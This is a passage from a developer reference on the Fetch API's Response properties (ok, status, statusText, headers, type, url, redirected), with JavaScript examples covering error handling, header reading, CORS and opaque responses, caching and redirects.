    case 404:
      throw new Error('Resource not found');
    case 401:
      throw new Error('Unauthorized');
    case 500:
      throw new Error('Server error');
    default:
      throw new Error(`HTTP error: ${response.status}`);
  }
}
```

### Edge Cases and Considerations

#### Redirects

Redirects (3xx) result in `response.ok === false`, but the Fetch API follows redirects by default unless `redirect: 'manual'` is specified.

```javascript
fetch(url, { redirect: 'manual' })
  .then(response => {
    if (response.type === 'opaqueredirect') {
      // Manual redirect handling
    }
  });
```

#### CORS and Opaque Responses

For `no-cors` requests, the response type is 'opaque', and `response.ok` will be `false` even if the request succeeded [Inference: based on opaque response restrictions].

```javascript
fetch(url, { mode: 'no-cors' })
  .then(response => {
    console.log(response.ok); // false
    console.log(response.status); // 0
    console.log(response.type); // 'opaque'
  });
```

#### 204 No Content

Status 204 returns `response.ok === true` but has no body. Attempting to parse will fail.

```javascript
fetch('/api/delete/123')
  .then(response => {
    if (!response.ok) {
      throw new Error('Delete failed');
    }
    // Don't try to parse if 204
    if (response.status === 204) {
      return null;
    }
    return response.json();
  });
```

### Best Practices

**Always check `response.ok`** before parsing the response body:

```javascript
// Good
const response = await fetch(url);
if (!response.ok) throw new Error('Request failed');
const data = await response.json();

// Bad - may attempt to parse error HTML as JSON
const response = await fetch(url);
const data = await response.json(); // Could fail
```

**Provide context in errors**:

```javascript
if (!response.ok) {
  const errorBody = await response.text();
  throw new Error(
    `HTTP ${response.status}: ${response.statusText}\n${errorBody}`
  );
}
```

**Consider retry logic for specific statuses**:

```javascript
async function fetchWithRetry(url, retries = 3) {
  for (let i = 0; i < retries; i++) {
    const response = await fetch(url);
    
    if (response.ok) return response;
    
    // Retry on 5xx server errors, not 4xx client errors
    if (response.status >= 500 && i < retries - 1) {
      await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
      continue;
    }
    
    throw new Error(`HTTP ${response.status}`);
  }
}
```

### Interaction with Response Methods

The `response.ok` property should be checked before calling any body-reading methods:

```javascript
const response = await fetch(url);

if (!response.ok) {
  // Still safe to read the body for error details
  const errorText = await response.text();
  throw new Error(errorText);
}

// Safe to parse as expected format
const data = await response.json();
```

### Browser Compatibility

The `Response.ok` property is part of the core Fetch API specification and has broad browser support across all modern browsers. [Unverified: specific version numbers without checking current compatibility tables]

---

## Response.status and statusText

### Response.status

Response.status is a read-only property that contains the HTTP status code of the response, such as 200 for success or 404 when a resource cannot be found.

#### Data Type and Values

The property returns an unsigned short number representing one of the HTTP response status codes.

**Special Case - Zero Status:** A value of 0 is returned for responses whose type is opaque, opaqueredirect, or error. This occurs in specific scenarios:

- **Opaque responses**: Created when making cross-origin requests with mode set to no-cors, where the status property is set to 0, body is null, and headers are empty and immutable
- **Opaqueredirect responses**: Result from requests with redirect option set to manual that were redirected by the server, where status is 0, body is null, and headers are empty and immutable
- **Error responses**: Network errors where status is 0, body is null, headers are empty and immutable

#### Common Status Codes

HTTP status codes are organized into categories:

**2xx Success codes** indicate the request was fulfilled successfully **3xx Redirection codes** represent redirect responses **4xx Client error codes** indicate issues with the request **5xx Server error codes** indicate server-side problems

#### Usage Example

```javascript
const myImage = document.querySelector("img");
const myRequest = new Request("flowers.jpg");

fetch(myRequest)
  .then((response) => {
    console.log("response.status =", response.status); // 200
    return response.blob();
  })
  .then((myBlob) => {
    const objectURL = URL.createObjectURL(myBlob);
    myImage.src = objectURL;
  });
```

#### Response Validation Pattern

Since fetch only rejects on network failures, manual status validation is commonly needed:

```javascript
const getData = async () => {
  const response = await fetch('https://example.com/users');
  
  if (response.ok) {
    const data = await response.json();
    return data;
  } else {
    console.log('error: ', response.status, response.statusText);
    return {error: {status: response.status, statusText: response.statusText}};
  }
};
```

The `response.ok` property provides a boolean shorthand that checks whether the status code falls within the 200-299 range.

---

### Response.statusText

Response.statusText is a read-only property containing the status message corresponding to the HTTP status code in Response.status. Examples include "OK" for 200, "Continue" for 100, and "Not Found" for 404.

#### Data Type and Default Value

The property returns a String containing the HTTP status message associated with the response, with a default value of an empty string "".

#### HTTP/2 Limitation

**[Unverified] The behavior of statusText with HTTP/2 connections has cross-browser inconsistencies.**

HTTP/2 does not support status messages. According to the HTTP/2 specification, HTTP/2 does not define a way to carry the version or reason phrase included in an HTTP/1.1 status line.

Responses over an HTTP/2 connection will always have an empty string as status message in the specification, but different browsers implement this differently - Chrome returns an empty string, Firefox returns traditional status text like "OK" or "Not Found", and Safari returns "HTTP/2.0 200" or "HTTP/2.0 404".

This inconsistency has practical implications. Applications checking for specific statusText values like "OK" may fail when using HTTP/2 connections where statusText returns empty, requiring code changes or HTTP/2 disabling as a workaround.

#### Usage Example

```javascript
const myImage = document.querySelector("img");
const myRequest = new Request("flowers.jpg");

fetch(myRequest)
  .then((response) => {
    console.log("response.statusText =", response.statusText); // "OK"
    return response.blob();
  })
  .then((myBlob) => {
    const objectURL = URL.createObjectURL(myBlob);
    myImage.src = objectURL;
  });
```

#### Error Handling with statusText

Combining status and statusText provides more descriptive error information:

```javascript
fetch(url)
  .then((response) => {
    if (response.ok) {
      return response.json();
    }
    throw response;
  })
  .catch((error) => {
    if (error instanceof Error) {
      return { error };
    }
    return error.json().then((responseJson) => {
      return {
        error: new Error(
          `HTTP ${error.status} ${error.statusText}: ${responseJson.msg}`
        )
      };
    });
  });
```

#### Best Practices

**[Inference] Relying on statusText for application logic is problematic** due to:

- HTTP/2 returning empty strings in some browsers
- Cross-browser inconsistencies
- API servers potentially omitting or customizing status messages

**[Inference] For robust error handling, prefer checking response.status numerically or using response.ok** rather than comparing statusText string values. The statusText should be treated as supplementary information for logging and debugging, not as the primary mechanism for response validation.

---

## Response.headers

The `Response.headers` property returns a `Headers` object containing the HTTP headers associated with the response. This read-only property provides access to metadata about the response, including content type, caching directives, CORS headers, and custom server headers.

### Structure and Type

`Response.headers` returns a `Headers` object, which is an iterable collection of key-value pairs. The Headers interface provides methods to read, set, append, and delete header entries.

```javascript
const response = await fetch('https://api.example.com/data');
console.log(response.headers); // Headers {}
console.log(response.headers.constructor.name); // "Headers"
```

### Reading Header Values

#### get() Method

The `get()` method retrieves a single header value by name. Header names are case-insensitive. Returns `null` if the header doesn't exist.

```javascript
const response = await fetch('https://api.example.com/data');

const contentType = response.headers.get('Content-Type');
const cacheControl = response.headers.get('cache-control'); // case-insensitive
const customHeader = response.headers.get('X-Custom-Header');

console.log(contentType); // "application/json; charset=utf-8"
console.log(customHeader); // null if not present
```

#### has() Method

The `has()` method checks whether a header exists, returning a boolean. Useful for conditional logic based on header presence.

```javascript
if (response.headers.has('ETag')) {
  const etag = response.headers.get('ETag');
  // Store ETag for conditional requests
}

if (response.headers.has('X-RateLimit-Remaining')) {
  const remaining = response.headers.get('X-RateLimit-Remaining');
  console.log(`API calls remaining: ${remaining}`);
}
```

#### getSetCookie() Method

The `getSetCookie()` method returns an array of all `Set-Cookie` header values. This is necessary because `Set-Cookie` can appear multiple times in a response, and `get()` would only return the first value.

```javascript
const response = await fetch('https://api.example.com/login', {
  method: 'POST',
  credentials: 'include'
});

const cookies = response.headers.getSetCookie();
console.log(cookies);
// ['session=abc123; Path=/; HttpOnly', 'preferences=dark; Path=/']
```

### Iterating Over Headers

#### for...of Loop

Headers objects are iterable, allowing direct iteration over all header entries.

```javascript
const response = await fetch('https://api.example.com/data');

for (const [name, value] of response.headers) {
  console.log(`${name}: ${value}`);
}
// Output:
// content-type: application/json
// cache-control: max-age=3600
// etag: "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

#### entries() Method

The `entries()` method returns an iterator of `[name, value]` pairs, functionally identical to using `for...of` directly on the Headers object.

```javascript
const response = await fetch('https://api.example.com/data');

for (const [name, value] of response.headers.entries()) {
  console.log(`${name}: ${value}`);
}
```

#### keys() Method

The `keys()` method returns an iterator of all header names.

```javascript
const response = await fetch('https://api.example.com/data');

for (const name of response.headers.keys()) {
  console.log(name);
}
// Output:
// content-type
// cache-control
// etag
```

#### values() Method

The `values()` method returns an iterator of all header values, without the corresponding names.

```javascript
const response = await fetch('https://api.example.com/data');

for (const value of response.headers.values()) {
  console.log(value);
}
// Output:
// application/json
// max-age=3600
// "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

#### forEach() Method

The `forEach()` method executes a callback function for each header entry.

```javascript
const response = await fetch('https://api.example.com/data');

response.headers.forEach((value, name) => {
  console.log(`${name}: ${value}`);
});
```

### Converting Headers to Other Formats

#### Converting to Plain Object

```javascript
const response = await fetch('https://api.example.com/data');

const headersObject = Object.fromEntries(response.headers.entries());
console.log(headersObject);
// {
//   'content-type': 'application/json',
//   'cache-control': 'max-age=3600',
//   'etag': '"33a64df551425fcc55e4d42a148795d9f25f89d4"'
// }
```

#### Converting to Array

```javascript
const response = await fetch('https://api.example.com/data');

const headersArray = Array.from(response.headers.entries());
console.log(headersArray);
// [
//   ['content-type', 'application/json'],
//   ['cache-control', 'max-age=3600'],
//   ['etag', '"33a64df551425fcc55e4d42a148795d9f25f89d4"']
// ]
```

### Common Response Headers

#### Content Headers

**Content-Type**: Indicates the media type of the response body.

```javascript
const contentType = response.headers.get('Content-Type');
// "application/json; charset=utf-8"
// "text/html; charset=UTF-8"
// "image/png"
```

**Content-Length**: The size of the response body in bytes.

```javascript
const contentLength = response.headers.get('Content-Length');
console.log(`Response size: ${contentLength} bytes`);
```

**Content-Encoding**: The encoding applied to the response body (e.g., gzip, deflate).

```javascript
const encoding = response.headers.get('Content-Encoding');
// "gzip"
// "br" (Brotli)
```

**Content-Language**: The natural language(s) of the intended audience.

```javascript
const language = response.headers.get('Content-Language');
// "en-US"
// "fr-FR, en-US"
```

#### Caching Headers

**Cache-Control**: Directives for caching mechanisms.

```javascript
const cacheControl = response.headers.get('Cache-Control');
// "max-age=3600, public"
// "no-cache, no-store, must-revalidate"
// "private, max-age=0"
```

**ETag**: An identifier for a specific version of a resource.

```javascript
const etag = response.headers.get('ETag');
// "33a64df551425fcc55e4d42a148795d9f25f89d4"
// W/"0815" (weak ETag)

// Use for conditional requests
const conditionalResponse = await fetch(url, {
  headers: {
    'If-None-Match': etag
  }
});
```

**Expires**: The date/time after which the response is considered stale.

```javascript
const expires = response.headers.get('Expires');
// "Wed, 21 Oct 2024 07:28:00 GMT"
```

**Last-Modified**: The date/time when the resource was last modified.

```javascript
const lastModified = response.headers.get('Last-Modified');
// "Tue, 15 Oct 2024 12:45:26 GMT"

// Use for conditional requests
const conditionalResponse = await fetch(url, {
  headers: {
    'If-Modified-Since': lastModified
  }
});
```

#### CORS Headers

**Access-Control-Allow-Origin**: Indicates which origins can access the resource.

```javascript
const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
// "*"
// "https://example.com"
```

**Access-Control-Allow-Methods**: Indicates which HTTP methods are allowed for CORS requests.

```javascript
const allowMethods = response.headers.get('Access-Control-Allow-Methods');
// "GET, POST, PUT, DELETE, OPTIONS"
```

**Access-Control-Allow-Headers**: Indicates which headers can be used in the actual request.

```javascript
const allowHeaders = response.headers.get('Access-Control-Allow-Headers');
// "Content-Type, Authorization, X-Custom-Header"
```

**Access-Control-Expose-Headers**: Indicates which headers can be exposed to the browser.

```javascript
const exposeHeaders = response.headers.get('Access-Control-Expose-Headers');
// "X-Total-Count, X-Page-Number"

// Without this header, custom headers won't be accessible
const totalCount = response.headers.get('X-Total-Count'); // null if not exposed
```

**Access-Control-Max-Age**: Indicates how long preflight request results can be cached.

```javascript
const maxAge = response.headers.get('Access-Control-Max-Age');
// "86400" (24 hours in seconds)
```

#### Authentication Headers

**WWW-Authenticate**: Indicates the authentication method that should be used.

```javascript
const authenticate = response.headers.get('WWW-Authenticate');
// "Basic realm=\"Access to API\""
// "Bearer realm=\"example\""
```

#### Rate Limiting Headers

Many APIs use custom headers for rate limiting information.

```javascript
const rateLimit = response.headers.get('X-RateLimit-Limit');
const rateRemaining = response.headers.get('X-RateLimit-Remaining');
const rateReset = response.headers.get('X-RateLimit-Reset');

console.log(`Rate limit: ${rateRemaining}/${rateLimit}`);
console.log(`Resets at: ${new Date(rateReset * 1000)}`);
```

#### Location Header

**Location**: Used in redirects to indicate the URL to redirect to.

```javascript
if (response.status === 301 || response.status === 302) {
  const location = response.headers.get('Location');
  console.log(`Redirected to: ${location}`);
}
```

### Practical Use Cases

#### Content Negotiation

```javascript
const response = await fetch('https://api.example.com/data', {
  headers: {
    'Accept': 'application/json'
  }
});

const contentType = response.headers.get('Content-Type');

if (contentType.includes('application/json')) {
  const data = await response.json();
  // Process JSON data
} else if (contentType.includes('text/html')) {
  const html = await response.text();
  // Process HTML
} else if (contentType.includes('text/csv')) {
  const csv = await response.text();
  // Process CSV
}
```

#### Implementing ETags for Caching

```javascript
// Store ETag from initial request
let cachedEtag = null;
let cachedData = null;

async function fetchWithETag(url) {
  const headers = {};
  
  if (cachedEtag) {
    headers['If-None-Match'] = cachedEtag;
  }
  
  const response = await fetch(url, { headers });
  
  if (response.status === 304) {
    console.log('Using cached data');
    return cachedData;
  }
  
  cachedEtag = response.headers.get('ETag');
  cachedData = await response.json();
  
  return cachedData;
}
```

#### Handling Pagination with Link Headers

```javascript
async function fetchAllPages(url) {
  const allData = [];
  let currentUrl = url;
  
  while (currentUrl) {
    const response = await fetch(currentUrl);
    const data = await response.json();
    allData.push(...data);
    
    const linkHeader = response.headers.get('Link');
    currentUrl = parseLinkHeader(linkHeader, 'next');
  }
  
  return allData;
}

function parseLinkHeader(header, rel) {
  if (!header) return null;
  
  const links = header.split(',');
  for (const link of links) {
    const [urlPart, relPart] = link.split(';');
    if (relPart && relPart.includes(`rel="${rel}"`)) {
      return urlPart.trim().slice(1, -1); // Remove < and >
    }
  }
  return null;
}
```

#### Detecting and Handling Rate Limits

```javascript
async function fetchWithRateLimit(url) {
  const response = await fetch(url);
  
  const remaining = parseInt(response.headers.get('X-RateLimit-Remaining'));
  const resetTime = parseInt(response.headers.get('X-RateLimit-Reset'));
  
  if (remaining === 0) {
    const waitTime = resetTime - Math.floor(Date.now() / 1000);
    console.warn(`Rate limit reached. Waiting ${waitTime} seconds...`);
    
    await new Promise(resolve => setTimeout(resolve, waitTime * 1000));
    return fetchWithRateLimit(url); // Retry after waiting
  }
  
  console.log(`API calls remaining: ${remaining}`);
  return response;
}
```

#### Content Security and Validation

```javascript
const response = await fetch('https://api.example.com/data');

// Check content type matches expectations
const contentType = response.headers.get('Content-Type');
if (!contentType || !contentType.includes('application/json')) {
  throw new Error(`Unexpected content type: ${contentType}`);
}

// Validate CORS headers for security
const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
if (allowOrigin !== '*' && allowOrigin !== window.location.origin) {
  console.warn('CORS configuration may be restrictive');
}

// Check for security headers
const csp = response.headers.get('Content-Security-Policy');
const xFrameOptions = response.headers.get('X-Frame-Options');
const strictTransportSecurity = response.headers.get('Strict-Transport-Security');

console.log('Security headers present:', {
  csp: !!csp,
  xFrameOptions: !!xFrameOptions,
  hsts: !!strictTransportSecurity
});
```

#### Custom Header Extraction

```javascript
async function fetchWithMetadata(url) {
  const response = await fetch(url);
  const data = await response.json();
  
  // Extract all custom headers (typically prefixed with X-)
  const customHeaders = {};
  for (const [name, value] of response.headers) {
    if (name.toLowerCase().startsWith('x-')) {
      customHeaders[name] = value;
    }
  }
  
  return {
    data,
    metadata: {
      customHeaders,
      timestamp: response.headers.get('Date'),
      requestId: response.headers.get('X-Request-ID'),
      serverVersion: response.headers.get('X-API-Version')
    }
  };
}
```

### Header Name Case Sensitivity

Header names in the Headers object are case-insensitive. The Headers API normalizes all header names to lowercase.

```javascript
const response = await fetch('https://api.example.com/data');

// All of these return the same value
console.log(response.headers.get('Content-Type'));
console.log(response.headers.get('content-type'));
console.log(response.headers.get('CONTENT-TYPE'));
console.log(response.headers.get('CoNtEnT-TyPe'));

// When iterating, names are always lowercase
for (const [name, value] of response.headers) {
  console.log(name); // Always lowercase: "content-type", not "Content-Type"
}
```

### Immutability

The `Response.headers` object is immutable. You cannot modify the headers of a response after it has been created. Methods like `set()`, `append()`, and `delete()` are not available on response headers (they exist on the Headers interface for request headers).

```javascript
const response = await fetch('https://api.example.com/data');

// These methods don't exist on response.headers
// response.headers.set('X-Custom', 'value'); // TypeError
// response.headers.append('X-Custom', 'value'); // TypeError
// response.headers.delete('Content-Type'); // TypeError

// To work with modified headers, create a new Response
const modifiedResponse = new Response(response.body, {
  status: response.status,
  statusText: response.statusText,
  headers: new Headers({
    ...Object.fromEntries(response.headers),
    'X-Custom-Header': 'custom-value'
  })
});
```

### Headers in Opaque Responses

When making a no-cors request, the response is "opaque" and most headers are not accessible.

```javascript
const response = await fetch('https://external-api.com/data', {
  mode: 'no-cors'
});

console.log(response.type); // "opaque"
console.log(response.headers.get('Content-Type')); // null
console.log([...response.headers].length); // 0

// Only certain headers are exposed in opaque responses:
// - Cache-Control
// - Content-Language
// - Content-Type
// - Expires
// - Last-Modified
// - Pragma
```

### Performance Considerations

#### Lazy Evaluation

Headers are typically not parsed until accessed, making header retrieval efficient.

```javascript
// This is fast - headers aren't parsed yet
const response = await fetch('https://api.example.com/data');

// Headers are parsed on first access
const contentType = response.headers.get('Content-Type'); // Parsing occurs here
```

#### Caching Header Values

If you need to access the same header multiple times, cache the value to avoid repeated lookups.

```javascript
// Less efficient
function processResponse(response) {
  if (response.headers.get('Content-Type').includes('json')) {
    // ...
  }
  
  if (response.headers.get('Content-Type').includes('charset')) {
    // ...
  }
  
  console.log(response.headers.get('Content-Type'));
}

// More efficient
function processResponse(response) {
  const contentType = response.headers.get('Content-Type');
  
  if (contentType.includes('json')) {
    // ...
  }
  
  if (contentType.includes('charset')) {
    // ...
  }
  
  console.log(contentType);
}
```

### Debugging and Logging

#### Logging All Headers

```javascript
function logHeaders(response) {
  console.group('Response Headers');
  for (const [name, value] of response.headers) {
    console.log(`${name}: ${value}`);
  }
  console.groupEnd();
}

const response = await fetch('https://api.example.com/data');
logHeaders(response);
```

#### Creating a Headers Inspection Utility

```javascript
function inspectHeaders(response) {
  const headers = Object.fromEntries(response.headers);
  
  return {
    all: headers,
    content: {
      type: headers['content-type'],
      length: headers['content-length'],
      encoding: headers['content-encoding']
    },
    caching: {
      cacheControl: headers['cache-control'],
      etag: headers['etag'],
      expires: headers['expires'],
      lastModified: headers['last-modified']
    },
    cors: {
      allowOrigin: headers['access-control-allow-origin'],
      allowMethods: headers['access-control-allow-methods'],
      allowHeaders: headers['access-control-allow-headers'],
      exposeHeaders: headers['access-control-expose-headers']
    },
    custom: Object.entries(headers)
      .filter(([name]) => name.startsWith('x-'))
      .reduce((acc, [name, value]) => ({ ...acc, [name]: value }), {})
  };
}

const response = await fetch('https://api.example.com/data');
console.log(inspectHeaders(response));
```

### Edge Cases and Gotchas

#### Multiple Set-Cookie Headers

The standard `get()` method only returns the first `Set-Cookie` value. Always use `getSetCookie()` for cookies.

```javascript
const response = await fetch('https://api.example.com/login');

// Wrong - only gets first cookie
const cookie = response.headers.get('Set-Cookie'); // Only first cookie

// Correct - gets all cookies
const cookies = response.headers.getSetCookie(); // Array of all cookies
```

#### Forbidden Header Names

Certain headers cannot be set programmatically in requests, but they may appear in responses. These are controlled by the browser or server.

```javascript
const response = await fetch('https://api.example.com/data');

// These headers may be present in responses
console.log(response.headers.get('Set-Cookie')); // May be present
console.log(response.headers.get('Date')); // Typically present
console.log(response.headers.get('Server')); // May be present
```

#### Empty or Missing Headers

Always check for `null` when accessing headers that may not exist.

```javascript
const response = await fetch('https://api.example.com/data');

// Unsafe - may throw if header is missing
const etag = response.headers.get('ETag').replace(/"/g, ''); // Error if null

// Safe - checks for existence
const etag = response.headers.get('ETag');
if (etag) {
  const cleanEtag = etag.replace(/"/g, '');
  // Process etag
}

// Alternative with optional chaining
const cleanEtag = response.headers.get('ETag')?.replace(/"/g, '') ?? 'none';
```

---

## Response.type

The `Response.type` property is a read-only attribute that indicates the type of response based on how it was obtained and the nature of the request that generated it.

### Property Value

`Response.type` returns a string with one of the following values:

#### basic

A standard same-origin response where all headers are accessible and the response can be fully read. This occurs when:

- The request was made to the same origin as the requesting page
- No CORS violations occurred
- The response is from the same domain, protocol, and port

#### cors

A valid cross-origin response received with proper CORS headers. Characteristics:

- The request was made to a different origin
- The server responded with appropriate CORS headers (`Access-Control-Allow-Origin`, etc.)
- Only CORS-safelisted headers are exposed by default
- Additional headers require explicit exposure via `Access-Control-Expose-Headers`

#### opaque

A cross-origin response to a `no-cors` request. This type has severe restrictions:

- The response body is inaccessible (cannot be read)
- Headers are inaccessible (cannot be read)
- Status is always 0
- `ok` property is always false
- Used primarily for resources loaded for side effects (fonts, images in `<img>`, scripts)
- Still consumes cache space despite being unreadable

#### opaqueredirect

The response resulted from a request made with `redirect: "manual"` mode, and the server returned a redirect status (3xx). Characteristics:

- Status is always 0
- Headers are inaccessible
- Body is inaccessible
- Allows manual handling of redirects in Service Workers
- The redirect was not automatically followed

#### error

The response represents a network error. Characteristics:

- Status is 0
- `ok` is false
- Typically created via `Response.error()`
- Represents a failed fetch operation
- Cannot be created through normal fetch requests that fail (those reject the promise instead)

### Practical Implications

#### Security and Privacy

The `type` property enforces web security boundaries:

- **opaque** responses prevent cross-origin information leakage
- JavaScript cannot read the contents of `opaque` responses, preventing attacks
- This protects sensitive data from unauthorized access

#### Cache Behavior

Response types affect caching differently:

- **opaque** responses still occupy cache storage despite being unreadable
- Cache API stores opaque responses at their full size
- This can lead to quota issues if many opaque responses are cached

#### Service Worker Considerations

Response types are particularly relevant in Service Workers:

```javascript
self.addEventListener('fetch', event => {
  event.respondWith(
    fetch(event.request)
      .then(response => {
        // Check response type before caching
        if (response.type === 'opaque') {
          console.warn('Caching opaque response - uses quota but unreadable');
        }
        
        if (response.type === 'error') {
          return Response.error();
        }
        
        // Clone before caching since response can only be read once
        const responseToCache = response.clone();
        
        caches.open('my-cache').then(cache => {
          cache.put(event.request, responseToCache);
        });
        
        return response;
      })
  );
});
```

#### Header Access Patterns

Different response types allow different header access:

**basic**: All response headers accessible

```javascript
const response = await fetch('/same-origin/data');
console.log(response.type); // "basic"
console.log(response.headers.get('Content-Type')); // Accessible
console.log(response.headers.get('X-Custom-Header')); // Accessible
```

**cors**: Only CORS-safelisted or explicitly exposed headers

```javascript
const response = await fetch('https://api.example.com/data');
console.log(response.type); // "cors"
console.log(response.headers.get('Content-Type')); // Accessible (safelisted)
console.log(response.headers.get('X-Custom-Header')); // null unless exposed via CORS
```

**opaque**: No headers accessible

```javascript
const response = await fetch('https://third-party.com/resource', {
  mode: 'no-cors'
});
console.log(response.type); // "opaque"
console.log(response.headers.get('Content-Type')); // null
console.log(response.status); // 0
```

### Request Mode Interaction

The `Response.type` is determined by the request mode:

|Request Mode|Possible Response Types|
|---|---|
|`same-origin`|`basic`, `error`|
|`cors`|`basic`, `cors`, `error`|
|`no-cors`|`opaque`, `error`|
|`navigate`|`basic`, `cors`, `opaque`, `error`|

### Type Checking Patterns

#### Validating Response Types

```javascript
async function fetchWithTypeCheck(url, expectedType) {
  const response = await fetch(url);
  
  if (response.type !== expectedType) {
    console.warn(`Expected ${expectedType}, got ${response.type}`);
  }
  
  return response;
}
```

#### Conditional Processing

```javascript
async function processResponse(url) {
  const response = await fetch(url);
  
  switch(response.type) {
    case 'basic':
    case 'cors':
      // Can safely read response
      return await response.json();
      
    case 'opaque':
      // Cannot read - only useful for side effects
      console.log('Opaque response received - content unreadable');
      return null;
      
    case 'error':
      throw new Error('Network error occurred');
      
    default:
      console.warn(`Unexpected response type: ${response.type}`);
      return null;
  }
}
```

### Common Pitfalls

#### Attempting to Read Opaque Responses

```javascript
// This will fail
const response = await fetch('https://external.com/api', { mode: 'no-cors' });
console.log(response.type); // "opaque"
const data = await response.json(); // TypeError: Body is unusable
```

#### Caching Opaque Responses Excessively

```javascript
// Problematic: fills cache with unreadable responses
self.addEventListener('fetch', event => {
  if (event.request.url.includes('third-party')) {
    event.respondWith(
      caches.match(event.request).then(cached => {
        if (cached) return cached;
        
        return fetch(event.request, { mode: 'no-cors' }).then(response => {
          // response.type is 'opaque' - takes up cache space but unreadable
          caches.open('external').then(cache => {
            cache.put(event.request, response.clone());
          });
          return response;
        });
      })
    );
  }
});
```

#### Not Handling Error Types

```javascript
// Better error handling
try {
  const response = await fetch(url);
  
  if (response.type === 'error') {
    throw new Error('Network request failed');
  }
  
  if (!response.ok) {
    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
  }
  
  return await response.json();
} catch (error) {
  console.error('Fetch failed:', error);
  throw error;
}
```

### Immutability

The `Response.type` property is immutable and set when the Response object is created. It cannot be modified:

```javascript
const response = await fetch('/api/data');
console.log(response.type); // "basic"

// This has no effect
response.type = 'cors'; // TypeError or silently fails in strict mode
console.log(response.type); // Still "basic"
```

### Cloning Behavior

When cloning a Response, the type is preserved:

```javascript
const original = await fetch('/data');
console.log(original.type); // "basic"

const cloned = original.clone();
console.log(cloned.type); // "basic" - same as original
```

### Constructed Responses

When manually constructing Response objects, the type defaults to `default`:

```javascript
const constructed = new Response('{"data": "value"}', {
  headers: { 'Content-Type': 'application/json' }
});

console.log(constructed.type); // "default" (not in the standard type list above)
```

[Inference] The `default` type likely behaves similarly to `basic` in terms of accessibility, though this is an implementation detail that may vary across browsers.

---

## Response.url

The `Response.url` property returns the final URL of the response after following any redirects. This is a read-only property that contains the URL from which the response was ultimately retrieved.

### Core Behavior

The `url` property reflects the final destination URL after the browser has completed any HTTP redirects (301, 302, 307, 308, etc.). If you fetch `https://example.com/old-page` which redirects to `https://example.com/new-page`, the `Response.url` will be `https://example.com/new-page`.

```javascript
const response = await fetch('https://example.com/redirect');
console.log(response.url); // Final URL after redirects
```

### URL Fragments Handling

**[Unverified]** URL fragments (the hash portion after `#`) are typically stripped from the `Response.url` property. If you fetch `https://example.com/page#section`, the `Response.url` will likely contain `https://example.com/page` without the fragment identifier, as fragments are client-side only and not sent to the server.

### Redirect Mode Interaction

The `Response.url` behavior interacts with the `redirect` option in the fetch request:

- **`redirect: 'follow'` (default)**: `Response.url` contains the final URL after all redirects
- **`redirect: 'manual'**: Returns an opaque redirect response;` Response.url` will be an empty string
- **`redirect: 'error'**: Throws a` TypeError` if a redirect occurs, so you won't get a Response object

```javascript
// Manual redirect handling
const response = await fetch('https://example.com/redirect', {
  redirect: 'manual'
});
console.log(response.url); // Empty string
console.log(response.type); // 'opaqueredirect'
```

### URL Resolution

The URL is always an absolute URL, even if you made the fetch request with a relative URL. The browser resolves relative URLs against the document's base URL before making the request.

```javascript
// If current page is https://example.com/folder/page.html
const response = await fetch('../data.json');
console.log(response.url); // 'https://example.com/data.json'
```

### Cross-Origin Scenarios

For same-origin requests, `Response.url` always contains the complete final URL. For cross-origin requests with CORS, the `Response.url` property still reflects the actual URL of the response, including any cross-origin redirects that occurred.

```javascript
// Cross-origin request
const response = await fetch('https://api.example.com/data');
console.log(response.url); // 'https://api.example.com/data' or final redirect destination
```

### Opaque Responses

For opaque responses (no-cors mode for cross-origin requests), the `Response.url` will be an empty string:

```javascript
const response = await fetch('https://other-domain.com/image.jpg', {
  mode: 'no-cors'
});
console.log(response.url); // Empty string
console.log(response.type); // 'opaque'
```

### Service Worker Considerations

When a Service Worker intercepts a fetch request and returns a synthetic response using `new Response()`, the `url` property of that response can be set explicitly:

```javascript
// Inside a service worker
self.addEventListener('fetch', event => {
  event.respondWith(
    new Response('Custom content', {
      headers: { 'Content-Type': 'text/plain' }
    })
  );
});
```

**[Inference]** The synthetic response's `url` property would likely reflect the request URL or be empty depending on how the Service Worker constructs it.

### Practical Use Cases

**Detecting redirects:**

```javascript
const requestedUrl = 'https://example.com/short-link';
const response = await fetch(requestedUrl);

if (response.url !== requestedUrl) {
  console.log(`Redirected from ${requestedUrl} to ${response.url}`);
}
```

**Validating final destination:**

```javascript
const response = await fetch('https://example.com/download');

// Check if we ended up at expected domain
const finalUrl = new URL(response.url);
if (finalUrl.hostname !== 'cdn.example.com') {
  console.warn('Unexpected redirect destination');
}
```

**Building resource maps:**

```javascript
async function fetchResources(urls) {
  const resourceMap = new Map();
  
  for (const url of urls) {
    const response = await fetch(url);
    resourceMap.set(response.url, await response.text());
  }
  
  return resourceMap;
}
```

### Immutability

The `Response.url` property is read-only and cannot be modified after the Response object is created. This ensures the integrity of the response metadata.

### Type Information

The property returns a `USVString` (a string containing Unicode scalar values), which in JavaScript is effectively a standard string type. The string will always be a valid URL or an empty string in specific cases (opaque responses, manual redirects).

---

## Response.redirected

The `Response.redirected` property is a read-only boolean that indicates whether the response is the result of a request that was redirected. It returns `true` if the final URL differs from the initial request URL after following one or more HTTP redirects.

### Property Characteristics

**Type**: Boolean (read-only)

**Returns**:

- `true` - The response resulted from a redirect (one or more 3xx status codes followed)
- `false` - The response was retrieved directly without redirection

### How Redirects Work with Fetch

By default, the Fetch API follows redirects automatically using the `follow` redirect mode. The `redirected` property allows you to detect when this automatic following has occurred.

```javascript
const response = await fetch('https://example.com/old-page');
console.log(response.redirected); // true if redirected, false otherwise
```

### Redirect Detection Scenarios

The property becomes `true` in these situations:

1. **301 Moved Permanently** - Resource has permanently moved to a new URL
2. **302 Found** - Temporary redirect to another URL
3. **303 See Other** - Response can be found at another URL using GET
4. **307 Temporary Redirect** - Temporary redirect, method and body preserved
5. **308 Permanent Redirect** - Permanent redirect, method and body preserved

### Accessing the Final URL

When a redirect occurs, you can access the final URL through `response.url`:

```javascript
const response = await fetch('https://example.com/redirect-me');

if (response.redirected) {
  console.log('Original URL: https://example.com/redirect-me');
  console.log('Final URL:', response.url);
  console.log('Was redirected:', response.redirected);
}
```

### Practical Use Cases

#### Security Validation

Verify that requests haven't been redirected to unexpected domains:

```javascript
async function fetchWithRedirectCheck(url) {
  const response = await fetch(url);
  
  if (response.redirected) {
    const originalDomain = new URL(url).hostname;
    const finalDomain = new URL(response.url).hostname;
    
